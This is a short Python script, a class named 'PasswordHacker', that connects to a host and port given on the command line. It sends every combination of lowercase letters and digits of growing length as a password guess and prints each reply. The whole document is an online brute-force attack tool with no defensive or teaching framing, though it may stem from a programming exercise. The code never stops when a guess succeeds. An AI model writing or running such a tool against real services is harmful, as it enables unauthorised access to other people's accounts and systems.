import sys
import socket
import itertools
from string import ascii_lowercase, digits

password_letters = ascii_lowercase + digits
password_length = len(password_letters)


class PasswordHacker:
    def __init__(self):
        self.address = (sys.argv[1], int(sys.argv[2]))
        self.send_receive()

    def send_receive(self):

        with socket.socket() as c:
            c.connect(self.address)
            for i in range(1, password_length):
                for password in itertools.product(password_letters, repeat=i):
                    password = ''.join(password)
                    c.send(password.encode())
                    print(c.recv(1024).decode())


if __name__ == '__main__':
    PasswordHacker()
